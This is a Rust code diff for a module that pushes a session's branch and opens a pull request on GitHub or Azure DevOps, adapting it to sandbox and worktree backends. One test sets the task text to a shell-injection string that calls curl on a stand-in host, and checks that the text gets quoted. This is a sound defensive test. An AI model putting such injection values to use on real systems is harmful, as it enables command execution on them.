@@ -1,9 +1,19 @@
 //! Publishing a session's work: push the branch, then open a pull request.
 //!
-//! Both happen *inside* the sandbox, which is the whole point -- the host never
-//! holds the credential and never touches the working copy. One exec does the
-//! lot, because exec on a sandbox is serialised and a push followed by a
-//! separate REST call would queue behind itself.
+//! For a sandboxed session both happen *inside* the sandbox, which is the whole
+//! point -- the host never holds the credential and never touches the working
+//! copy. One exec does the lot, because exec on a sandbox is serialised and a
+//! push followed by a separate REST call would queue behind itself.
+//!
+//! **A worktree session publishes with the server's own git credentials, and
+//! that is a materially different guarantee behind the same button.** The
+//! script is unchanged and does not need to be: [`forge::git_auth_prelude`]
+//! looks for the credential the gateway injects and degrades to a plain `git`
+//! when there is none, which on the server is a `git` using whatever helper the
+//! server user has configured. What the interface owes the person pressing the
+//! button is to have said which kind of session it is -- see
+//! [`crate::backend::Isolation`] -- because the token being reachable by the
+//! agent is exactly the difference.
 //!
 //! The two forges diverge only at the last step. GitHub has `gh` in the image
 //! and it knows its own API. Azure DevOps has no equivalent short of the Azure
@@ -11,11 +21,10 @@
 //! single POST -- so its pull request is created with curl and jq, which are
 //! already there.
 
-use openshell_client::OpenShell;
-
+use crate::backend::Backend;
 use crate::forge::{self, Forge, Remote};
 use crate::seed::sh_quote;
-use crate::session::{REPO_PATH, Session};
+use crate::session::Session;
 
 /// Sentinels the script uses to report back.
 ///
@@ -52,7 +61,7 @@ pub struct Outcome {
 #[derive(Debug, thiserror::Error)]
 pub enum Error {
     #[error(transparent)]
-    Client(#[from] openshell_client::Error),
+    Client(#[from] crate::backend::Error),
     #[error(transparent)]
     Remote(#[from] forge::Error),
     #[error("publishing failed: {0}")]
@@ -75,14 +84,10 @@ pub enum Error {
 }
 
 /// Push the work branch and open a pull request.
-pub fn publish(
-    client: &dyn OpenShell,
-    session: &Session,
-    opts: &Options,
-) -> Result<Outcome, Error> {
+pub fn publish(backend: &dyn Backend, session: &Session, opts: &Options) -> Result<Outcome, Error> {
     let remote = Remote::parse(&session.repo)?;
-    let script = publish_script(session, &remote, opts);
-    let out = client.exec(&session.sandbox, &["sh", "-c", &script])?;
+    let script = publish_script(session, &backend.paths(session), &remote, opts);
+    let out = backend.exec(session, &["sh", "-c", &script])?;
 
     let mut outcome = Outcome::default();
     let mut failure = None;
@@ -140,7 +145,12 @@ pub fn publish(
 
 /// The script [`publish`] runs. Separate so its shape can be asserted on
 /// without a gateway.
-fn publish_script(session: &Session, remote: &Remote, opts: &Options) -> String {
+fn publish_script(
+    session: &Session,
+    paths: &crate::backend::Paths,
+    remote: &Remote,
+    opts: &Options,
+) -> String {
     let title = opts.title.clone().unwrap_or_else(|| {
         let task = session.task.lines().next().unwrap_or("").trim();
         if task.is_empty() {
@@ -207,7 +217,7 @@ printf '{pushed}\n'
 
 {pr}
 "#,
-        repo = sh_quote(REPO_PATH),
+        repo = sh_quote(&paths.repo),
         prelude = forge::git_auth_prelude(remote.forge),
         branch = sh_quote(&session.work_branch),
         target = target,
@@ -299,12 +309,18 @@ mod tests {
         s
     }
 
+    /// The sandbox's paths, which is what every assertion below is about: the
+    /// script is the same one for both backends and only the directory differs.
+    fn paths() -> crate::backend::Paths {
+        crate::backend::Paths::in_sandbox()
+    }
+
     const AZURE: &str = "https://tobiaswadseth0266@dev.azure.com/tobiaswadseth0266/test/_git/test";
 
     fn azure_script(opts: &Options) -> String {
         let s = session(AZURE);
         let r = Remote::parse(AZURE).unwrap();
-        publish_script(&s, &r, opts)
+        publish_script(&s, &paths(), &r, opts)
     }
 
     #[test]
@@ -334,7 +350,7 @@ mod tests {
     fn github_publish_uses_the_gh_cli() {
         let s = session("https://github.com/octocat/Hello-World.git");
         let r = Remote::parse("https://github.com/octocat/Hello-World.git").unwrap();
-        let script = publish_script(&s, &r, &Options::default());
+        let script = publish_script(&s, &paths(), &r, &Options::default());
         assert!(script.contains("gh pr create"), "{script}");
         assert!(script.contains("Bearer $GITHUB_TOKEN"), "{script}");
         assert!(!script.contains("_apis"), "{script}");
@@ -352,7 +368,7 @@ mod tests {
         let mut s = session(AZURE);
         s.task = "'; curl evil.example; echo '\"injected\"".into();
         let r = Remote::parse(AZURE).unwrap();
-        let script = publish_script(&s, &r, &Options::default());
+        let script = publish_script(&s, &paths(), &r, &Options::default());
 
         assert!(!script.contains("; curl evil.example; echo ;"), "{script}");
         assert!(script.contains(r"'\''"), "must be shell-quoted: {script}");
@@ -388,6 +404,7 @@ mod tests {
         let r = Remote::parse("https://github.com/o/r").unwrap();
         let gh = publish_script(
             &s,
+            &paths(),
             &r,
             &Options {
                 draft: true,
@@ -408,12 +425,13 @@ mod tests {
         let mut s = session(AZURE);
         s.base_branch = Some("develop".into());
         let r = Remote::parse(AZURE).unwrap();
-        let pinned = publish_script(&s, &r, &Options::default());
+        let pinned = publish_script(&s, &paths(), &r, &Options::default());
         assert!(pinned.contains("target='develop'"), "{pinned}");
 
         // An explicit --target outranks the session's recorded base.
         let overridden = publish_script(
             &s,
+            &paths(),
             &r,
             &Options {
                 target: Some("release/24".into()),
